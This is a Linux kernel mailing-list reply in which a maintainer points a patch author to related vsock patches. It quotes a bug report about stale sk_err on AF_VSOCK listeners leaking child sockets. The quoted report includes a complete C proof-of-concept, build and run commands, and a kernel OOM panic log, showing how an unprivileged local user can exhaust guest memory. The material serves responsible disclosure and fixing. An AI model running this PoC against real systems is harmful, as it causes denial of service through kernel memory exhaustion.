Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AF70C3EDE6C
	for <virtualization@lists.linux.dev>; Tue, 28 Jul 2026 08:38:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.133.124
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785227892; cv=none; b=toTpxjGuo86bdnK3jfzSV6wQh1xmefyyN8+LcX6aQU3ErEaIadbKzdYXVizQfuFfWSPib1fggw0L+lsV1aJxB0JGVPvTqSN6B+pQGP1YRpVtkZT2+pROCDlgSC8P2x128bjys3Oy2qbhUGxZldyQUWuBgWUl/o/13sO3Kx4sFEI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785227892; c=relaxed/simple;
	bh=43DrZt6ejn6FUfsxCEvgKE5UKB3ys9DkGvgfz3Mi4jI=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 In-Reply-To:Content-Type:Content-Disposition; b=aEKRRhZQO1/uzJwG0VxOiCLLp0r6xgD13q/5sm/1LZRjR4BB6l5E5pxSEMqaD7g+TL92NW0gKZ/I6cW0skQ3L6ezV1K+7endgZSipRdoyL+ns3TfZNgCzUmc6sOpAFipVRwHpdBOXrOT2jPWF75hYOttO6ufNw5cLdC+flyrgpM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=EIpOfCJP; arc=none smtp.client-ip=170.10.133.124
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="EIpOfCJP"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1785227889;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=CM7SzTFkXyrhYH5cGOD06rBFksV47W6VIi5euG6/i2I=;
	b=EIpOfCJPsptqRWO/Ne6LY5frF/ZYmWGUgiKC90q/tRaDVPOMORlKhtPm7ByAb+KZcPKhkH
	zzKUzdTIWflZGgaydjPhAiU0mDKs3IU9g2elulLfEzf+LUOhI4fSNyXTSHS73TVX9XO8ul
	hSzIY+NnEoESdjCp4fZYuYDN6ReNEjo=
Received: from mail-wr1-f72.google.com (mail-wr1-f72.google.com
 [209.85.221.72]) by relay.mimecast.com with ESMTP with STARTTLS
 (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
 us-mta-36-PJq1UdTSM766mtm53BbNfA-1; Tue, 28 Jul 2026 04:38:07 -0400
X-MC-Unique: PJq1UdTSM766mtm53BbNfA-1
X-Mimecast-MFC-AGG-ID: PJq1UdTSM766mtm53BbNfA_1785227886
Received: by mail-wr1-f72.google.com with SMTP id ffacd0b85a97d-47f83450a8eso3124165f8f.0
        for <virtualization@lists.linux.dev>; Tue, 28 Jul 2026 01:38:07 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785227886; x=1785832686;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=CM7SzTFkXyrhYH5cGOD06rBFksV47W6VIi5euG6/i2I=;
        b=VsP4eeQMsFOhxgbq6x4HSLMiCW+LZbTA+iJy9SIivAg/a/T1VZALK1OsyTR0N+DcIJ
         O3CNe8OoHzUjj8qfLEWv+j1Miz0AyLLn2dd1DooOhhhHh6SKyV0ZIPH4lTrhAJ+Km90k
         Oo1YPiz98l1LNmIc0lDF1v/a9KFwWPVLOTG5VpQxiDrLEiGJLV/79V8yTWOLLf1VTSRF
         got9SiJEgT6CBfzitLUuXlP+qxOkH+Ogu4j9iY7DKFbDiVbzxPhptVYckxerBSecBrjT
         Fv1slxJf3Tbj82PdO9MC7hfJiMc+CvjDzej6WxqzwXG7vMxAUEJbJR5RZTtfCDXy4t30
         EnVQ==
X-Gm-Message-State: AOJu0YxzSynuo3MbwdUW/3dQoM2PhsPRsRrpIMV/BJZHOit92MZ8crH8
	24QbkkfRuDqZxS7CaYPvJO7sAwekPmvhEemmOT03VBlbogha/Cn7qWxOB9At2VoH2wLoRCD1Tw/
	TOA7gRsVSoxQcNEKDy/z3osyBU8exuVmBjfxAwTMhhJY+jW+NeYQhciZNXVJXoenSBf8K
X-Gm-Gg: AR+sD13aEDx9xtzVjpKwODvyETq1t/eicALWH/cyt5CUUpb7d2bYwU/1HJRxyyijURC
	5gNQRbmaVg0ynmDsm7EyLbEeqOmX5XrVStUX4Axazo2xJJHQ9F8UC6Sasy1WcTtPfy59Vch4nff
	YBrh7MbbhSroGuopUrHxZFvAF9PSSqblzgFdSooMrbgz4RrOspg6elTRZas0UYtwDTQm9ywWBQB
	DuMTWOtm+O67tKMGFIYG4WSmtNe5HqvdP4djXnkmpIMPLmK4iQcKhN6S7F1pcGHKjRkaYBRdoX6
	rDd972BMHpn0gfzBvC/kK6YwWbu0fSkMDC/7Dn92E/+Ewydwh4swC/F+EZGAq78vWfLmDbaerrJ
	yxa/IeLzVrV4mLkgFQ0tLjiTFGcn4eCreox/J6hT6Yac=
X-Received: by 2002:a05:600c:3115:b0:495:4e1d:82df with SMTP id 5b1f17b1804b1-496c642c72amr15111745e9.10.1785227885811;
        Tue, 28 Jul 2026 01:38:05 -0700 (PDT)
X-Received: by 2002:a05:600c:3115:b0:495:4e1d:82df with SMTP id 5b1f17b1804b1-496c642c72amr15111385e9.10.1785227885287;
        Tue, 28 Jul 2026 01:38:05 -0700 (PDT)
Received: from sgarzare-redhat (ip139-137-192-82.pool-bba.aruba.it. [82.192.137.139])
        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-496c44b84edsm93633145e9.5.2026.07.28.01.38.03
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 28 Jul 2026 01:38:04 -0700 (PDT)
Date: Tue, 28 Jul 2026 10:37:59 +0200
From: Stefano Garzarella <sgarzare@redhat.com>
To: Ren Wei <enjou1224z@gmail.com>
Cc: virtualization@lists.linux.dev, netdev@vger.kernel.org, 
	davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, horms@kernel.org, 
	dtor@vmware.com, georgezhang@vmware.com, acking@vmware.com, vega@nebusec.ai, 
	zihanx@nebusec.ai
Subject: Re: [PATCH net 0/1] vsock: clear stale sk_err before listen()
Message-ID: <amhpGj8ikeyfYazT@sgarzare-redhat>
References: <cover.1784649300.git.zihanx@nebusec.ai>
Precedence: bulk
X-Mailing-List: virtualization@lists.linux.dev
List-Id: <virtualization.lists.linux.dev>
List-Subscribe: <mailto:virtualization+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
In-Reply-To: <cover.1784649300.git.zihanx@nebusec.ai>
X-Mimecast-Spam-Score: 0
X-Mimecast-MFC-PROC-ID: T5hQ8oZJGKBbhp6LBBYsnxKZz4d5nrxutaanqtSG3qE_1785227886
X-Mimecast-Originator: redhat.com
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline

On Fri, Jul 24, 2026 at 01:21:13AM +0800, Ren Wei wrote:
>From: Zihan Xi <zihanx@nebusec.ai>
>
>Hi Linux kernel maintainers,
>
>We found and validated an issue in net/vmw_vsock/af_vsock.c. The bug is
>reachable by an unprivileged local user via AF_VSOCK loopback. We've
>tested it, and it should not affect any other functionality.

Please check the following patches under discusion that seem related to 
the issue you are reporting:
- https://lore.kernel.org/virtualization/20260719220103.684489-1-phind.uet@gmail.com/
- https://lore.kernel.org/virtualization/20260727071305.45826-1-phind.uet@gmail.com/

If you test it, please send a Tested-by

Thanks,
Stefano

>
>This series contains one patch:
>  1/1 vsock: clear stale sk_err before listen()
>
>We provide bug details, reproducer steps, and a crash log below.
>
>---- details below ----
>
>Bug details:
>
>A failed loopback connect() can leave sk_err set on a reusable AF_VSOCK
>socket. If userspace then calls listen() on the same socket, the stale
>error remains attached to the listener. A later child can still reach the
>accept queue, but vsock_accept() sees listener->sk_err, rejects the
>child, and drops only the transient accept reference.
>
>On the virtio loopback path that rejected child can remain orphaned in the
>vsock tables, so repeated iterations leak children and can eventually
>push the guest into OOM. Clearing sk_err in vsock_listen() prevents a
>failed connect() attempt from poisoning the next listener incarnation of
>that socket.
>
>On our fixed-kernel validation, the same minimal reproducer no longer hit
>that failed accept path and accept() returned a valid child socket.
>
>Reproducer:
>
>    cc -O2 -Wall -Wextra -pthread -o /root/poc /root/poc.c
>    echo 2 > /proc/sys/vm/panic_on_oom
>    echo 1 > /proc/sys/vm/oom_dump_tasks
>    /root/poc 100 44000 54000 33554432 33554432 600
>
>We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
>
>------BEGIN poc.c------
>
>#define _GNU_SOURCE
>
>#include <arpa/inet.h>
>#include <errno.h>
>#include <linux/vm_sockets.h>
>#include <pthread.h>
>#include <signal.h>
>#include <stdbool.h>
>#include <stdint.h>
>#include <stdio.h>
>#include <stdlib.h>
>#include <string.h>
>#include <sys/socket.h>
>#include <sys/time.h>
>#include <sys/types.h>
>#include <time.h>
>#include <unistd.h>
>
>#define DEFAULT_BASE_PORT 40000U
>#define DEFAULT_FAIL_PORT 50000U
>#define DEFAULT_BUFFER_SIZE (32ULL * 1024 * 1024)
>#define DEFAULT_SEND_BYTES (32ULL * 1024 * 1024)
>#define DEFAULT_ITERATIONS 1U
>
>struct client_ctx {
>	pthread_mutex_t lock;
>	pthread_cond_t cond;
>	unsigned int server_port;
>	unsigned int client_port;
>	unsigned long long send_bytes;
>	unsigned long long bytes_sent;
>	int connect_errno;
>	int send_errno;
>	int sent_any;
>	int connected;
>	int done;
>	int fd;
>};
>
>static void die(const char *msg)
>{
>	perror(msg);
>	exit(EXIT_FAILURE);
>}
>
>static void set_vsock_u64(int fd, int optname, unsigned long long val)
>{
>	if (setsockopt(fd, AF_VSOCK, optname, &val, sizeof(val)) < 0)
>		die("setsockopt(AF_VSOCK)");
>}
>
>static void set_connect_timeout(int fd, long sec)
>{
>	struct timeval tv = {
>		.tv_sec = sec,
>		.tv_usec = 0,
>	};
>
>	if (setsockopt(fd, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT,
>		       &tv, sizeof(tv)) < 0) {
>		die("setsockopt(SO_VM_SOCKETS_CONNECT_TIMEOUT)");
>	}
>}
>
>static void bind_vsock(int fd, unsigned int cid, unsigned int port)
>{
>	struct sockaddr_vm svm = {
>		.svm_family = AF_VSOCK,
>		.svm_cid = cid,
>		.svm_port = port,
>	};
>
>	if (bind(fd, (struct sockaddr *)&svm, sizeof(svm)) < 0)
>		die("bind(AF_VSOCK)");
>}
>
>static int connect_vsock_errno(int fd, unsigned int cid, unsigned int port)
>{
>	struct sockaddr_vm svm = {
>		.svm_family = AF_VSOCK,
>		.svm_cid = cid,
>		.svm_port = port,
>	};
>
>	if (connect(fd, (struct sockaddr *)&svm, sizeof(svm)) == 0)
>		return 0;
>
>	return errno;
>}
>
>static void *client_thread(void *arg)
>{
>	struct client_ctx *ctx = arg;
>	char *buf;
>	unsigned long long sent = 0;
>	const size_t chunk = 64 * 1024;
>	int fd;
>	int err;
>
>	fd = socket(AF_VSOCK, SOCK_STREAM, 0);
>	if (fd < 0)
>		die("client socket(AF_VSOCK)");
>
>	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, ctx->send_bytes);
>	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, ctx->send_bytes);
>	bind_vsock(fd, VMADDR_CID_LOCAL, ctx->client_port);
>
>	err = connect_vsock_errno(fd, VMADDR_CID_LOCAL, ctx->server_port);
>
>	pthread_mutex_lock(&ctx->lock);
>	ctx->fd = fd;
>	ctx->connect_errno = err;
>	ctx->connected = (err == 0);
>	pthread_cond_broadcast(&ctx->cond);
>	pthread_mutex_unlock(&ctx->lock);
>
>	if (err)
>		return NULL;
>
>	buf = malloc(chunk);
>	if (!buf)
>		die("malloc");
>	memset(buf, 'A', chunk);
>
>	while (sent < ctx->send_bytes) {
>		size_t todo = chunk;
>		ssize_t rc;
>
>		if (ctx->send_bytes - sent < todo)
>			todo = ctx->send_bytes - sent;
>
>		rc = send(fd, buf, todo, 0);
>		if (rc < 0) {
>			pthread_mutex_lock(&ctx->lock);
>			ctx->send_errno = errno;
>			pthread_mutex_unlock(&ctx->lock);
>			break;
>		}
>
>		if (rc == 0)
>			break;
>
>		sent += rc;
>		pthread_mutex_lock(&ctx->lock);
>		ctx->sent_any = 1;
>		ctx->bytes_sent = sent;
>		pthread_cond_broadcast(&ctx->cond);
>		pthread_mutex_unlock(&ctx->lock);
>	}
>
>	free(buf);
>
>	pthread_mutex_lock(&ctx->lock);
>	ctx->done = 1;
>	pthread_cond_broadcast(&ctx->cond);
>	pthread_mutex_unlock(&ctx->lock);
>
>	return NULL;
>}
>
>static void client_ctx_init(struct client_ctx *ctx, unsigned int server_port,
>			    unsigned int client_port,
>			    unsigned long long send_bytes)
>{
>	memset(ctx, 0, sizeof(*ctx));
>	pthread_mutex_init(&ctx->lock, NULL);
>	pthread_cond_init(&ctx->cond, NULL);
>	ctx->server_port = server_port;
>	ctx->client_port = client_port;
>	ctx->send_bytes = send_bytes;
>	ctx->fd = -1;
>}
>
>static void client_ctx_destroy(struct client_ctx *ctx)
>{
>	pthread_mutex_destroy(&ctx->lock);
>	pthread_cond_destroy(&ctx->cond);
>}
>
>static int wait_for_connect(struct client_ctx *ctx)
>{
>	int err;
>
>	pthread_mutex_lock(&ctx->lock);
>	while (!ctx->connected && ctx->connect_errno == 0)
>		pthread_cond_wait(&ctx->cond, &ctx->lock);
>	err = ctx->connect_errno;
>	pthread_mutex_unlock(&ctx->lock);
>
>	return err;
>}
>
>static void wait_for_send_progress(struct client_ctx *ctx)
>{
>	struct timespec ts;
>
>	clock_gettime(CLOCK_REALTIME, &ts);
>	ts.tv_sec += 2;
>	if (ts.tv_nsec >= 1000000000L) {
>		ts.tv_sec += 1;
>		ts.tv_nsec -= 1000000000L;
>	}
>
>	pthread_mutex_lock(&ctx->lock);
>	if (!ctx->done)
>		pthread_cond_timedwait(&ctx->cond, &ctx->lock, &ts);
>	pthread_mutex_unlock(&ctx->lock);
>}
>
>static int prepare_listener(unsigned int server_port, unsigned int fail_port,
>			    unsigned long long buffer_size)
>{
>	int fd;
>	int err;
>
>	fd = socket(AF_VSOCK, SOCK_STREAM, 0);
>	if (fd < 0)
>		die("listener socket(AF_VSOCK)");
>
>	set_connect_timeout(fd, 1);
>	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, buffer_size);
>	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, buffer_size);
>	bind_vsock(fd, VMADDR_CID_LOCAL, server_port);
>
>	err = connect_vsock_errno(fd, VMADDR_CID_LOCAL, fail_port);
>	if (err == 0) {
>		fprintf(stderr, "unexpected successful failed-connect setup on port %u\n",
>			fail_port);
>		exit(EXIT_FAILURE);
>	}
>
>	fprintf(stderr, "[*] setup connect() failed with errno=%d (%s)\n",
>		err, strerror(err));
>
>	if (listen(fd, 1) < 0)
>		die("listen(AF_VSOCK)");
>
>	return fd;
>}
>
>static int trigger_once(unsigned int server_port, unsigned int fail_port,
>			unsigned int client_port,
>			unsigned long long buffer_size,
>			unsigned long long send_bytes)
>{
>	struct client_ctx ctx;
>	pthread_t tid;
>	int listener_fd;
>	int accept_fd;
>	int accept_errno;
>
>	listener_fd = prepare_listener(server_port, fail_port, buffer_size);
>
>	client_ctx_init(&ctx, server_port, client_port, send_bytes);
>	if (pthread_create(&tid, NULL, client_thread, &ctx) != 0)
>		die("pthread_create");
>
>	if (wait_for_connect(&ctx) != 0) {
>		fprintf(stderr, "client connect failed with errno=%d (%s)\n",
>			ctx.connect_errno, strerror(ctx.connect_errno));
>		exit(EXIT_FAILURE);
>	}
>
>	wait_for_send_progress(&ctx);
>
>	accept_fd = accept(listener_fd, NULL, NULL);
>	accept_errno = errno;
>
>	fprintf(stderr, "[*] accept() returned fd=%d errno=%d (%s)\n",
>		accept_fd, accept_errno, strerror(accept_errno));
>
>	if (accept_fd >= 0) {
>		fprintf(stderr, "unexpected successful accept()\n");
>		exit(EXIT_FAILURE);
>	}
>
>	if (accept_errno != ECONNRESET) {
>		fprintf(stderr, "unexpected accept errno: %d (%s)\n",
>			accept_errno, strerror(accept_errno));
>		exit(EXIT_FAILURE);
>	}
>
>	close(listener_fd);
>
>	pthread_join(tid, NULL);
>
>	fprintf(stderr,
>		"[*] client connect errno=%d send errno=%d bytes_sent=%llu sent_any=%d done=%d\n",
>		ctx.connect_errno, ctx.send_errno, ctx.bytes_sent,
>		ctx.sent_any, ctx.done);
>	accept_fd = ctx.fd;
>	ctx.fd = -1;
>	client_ctx_destroy(&ctx);
>	return accept_fd;
>}
>
>static unsigned int parse_u32(const char *s)
>{
>	unsigned long long v = strtoull(s, NULL, 0);
>
>	if (v > UINT32_MAX) {
>		fprintf(stderr, "value too large: %s\n", s);
>		exit(EXIT_FAILURE);
>	}
>
>	return (unsigned int)v;
>}
>
>static unsigned long long parse_u64(const char *s)
>{
>	return strtoull(s, NULL, 0);
>}
>
>int main(int argc, char **argv)
>{
>	unsigned int iterations = DEFAULT_ITERATIONS;
>	unsigned int base_port = DEFAULT_BASE_PORT;
>	unsigned int fail_base = DEFAULT_FAIL_PORT;
>	unsigned long long buffer_size = DEFAULT_BUFFER_SIZE;
>	unsigned long long send_bytes = DEFAULT_SEND_BYTES;
>	unsigned int hold_seconds = 0;
>	int *held_fds;
>	unsigned int i;
>
>	signal(SIGPIPE, SIG_IGN);
>
>	if (argc > 1)
>		iterations = parse_u32(argv[1]);
>	if (argc > 2)
>		base_port = parse_u32(argv[2]);
>	if (argc > 3)
>		fail_base = parse_u32(argv[3]);
>	if (argc > 4)
>		buffer_size = parse_u64(argv[4]);
>	if (argc > 5)
>		send_bytes = parse_u64(argv[5]);
>	if (argc > 6)
>		hold_seconds = parse_u32(argv[6]);
>
>	held_fds = calloc(iterations, sizeof(*held_fds));
>	if (!held_fds)
>		die("calloc");
>
>	for (i = 0; i < iterations; i++)
>		held_fds[i] = -1;
>
>	fprintf(stderr,
>		"[*] iterations=%u base_port=%u fail_base=%u buffer_size=%llu send_bytes=%llu hold_seconds=%u\n",
>		iterations, base_port, fail_base, buffer_size, send_bytes,
>		hold_seconds);
>
>	for (i = 0; i < iterations; i++) {
>		unsigned int server_port = base_port + (i * 2);
>		unsigned int client_port = base_port + (i * 2) + 1;
>		unsigned int fail_port = fail_base + i;
>
>		fprintf(stderr,
>			"[*] iteration=%u server_port=%u client_port=%u fail_port=%u\n",
>			i, server_port, client_port, fail_port);
>		held_fds[i] = trigger_once(server_port, fail_port, client_port,
>					   buffer_size, send_bytes);
>		fprintf(stderr, "[*] holding client fd=%d\n", held_fds[i]);
>	}
>
>	if (hold_seconds) {
>		fprintf(stderr, "[*] sleeping for %u seconds with client sockets open\n",
>			hold_seconds);
>		sleep(hold_seconds);
>	}
>
>	for (i = 0; i < iterations; i++) {
>		if (held_fds[i] >= 0)
>			close(held_fds[i]);
>	}
>
>	free(held_fds);
>
>	return 0;
>}
>
>------END poc.c--------
>
>----BEGIN crash log----
>
>[  921.941962][T10458] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
>[  921.942839][T10458] CPU: 0 UID: 0 PID: 10458 Comm: poc Not tainted 6.12.74 #3
>[  921.943455][T10458] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
>[  921.944405][T10458] Call Trace:
>[  921.944701][T10458]  <TASK>
>[  921.944974][T10458]  dump_stack_lvl+0x3b/0x1f0
>[  921.945423][T10458]  panic+0x6fe/0x7e0
>[  921.945802][T10458]  ? dump_header+0x6c2/0x950
>[  921.946233][T10458]  ? __pfx_panic+0x10/0x10
>[  921.947686][T10458]  ? out_of_memory+0x8c5/0x16b0
>[  921.948137][T10458]  out_of_memory+0x8f3/0x16b0
>[  921.949926][T10458]  __alloc_pages_noprof+0x1ec3/0x26d0
>[  921.954378][T10458]  alloc_pages_mpol_noprof+0x2ce/0x610
>[  921.956796][T10458]  folio_alloc_noprof+0x23/0xd0
>[  921.957720][T10458]  filemap_alloc_folio_noprof+0x35d/0x420
>[  921.959719][T10458]  filemap_fault+0x675/0x2800
>[  921.962920][T10458]  do_pte_missing+0x174c/0x3ff0
>[  921.964830][T10458]  __handle_mm_fault+0xfa3/0x2a10
>[  921.967730][T10458]  handle_mm_fault+0x3f5/0xa00
>[  921.968200][T10458]  do_user_addr_fault+0x50a/0x1490
>[  921.968691][T10458]  exc_page_fault+0x5d/0xe0
>[  921.969113][T10458]  asm_exc_page_fault+0x26/0x30
>[  921.969561][T10458] RIP: 0033:0x7f47a09b2237
>[  921.969990][T10458] Code: Unable to access opcode bytes at 0x7f47a09b220d.
>[  921.970550][T10458] RSP: 002b:00007f47a089be60 EFLAGS: 00010202
>[  921.971073][T10458] RAX: 0000000000010000 RBX: 00007ffe78934c80 RCX: 00007f47a0942c8e
>[  921.972372][T10458] RDX: 000000000000002c RSI: 0000000000000000 RDI: 0000000000000016
>[  921.973017][T10458] RBP: 0000000001800000 R08: 0000000000000000 R09: 0000000000000000
>[  921.974428][T10458]  </TASK>
>[  921.974959][T10458] Kernel Offset: disabled
>[  921.975445][T10458] Rebooting in 86400 seconds..
>
>-----END crash log-----
>
>Best regards,
>Zihan Xi
>
>Zihan Xi (1):
>  vsock: clear stale sk_err before listen()
>
> net/vmw_vsock/af_vsock.c | 4 ++++
> 1 file changed, 4 insertions(+)
>
>-- 
>2.43.0
>

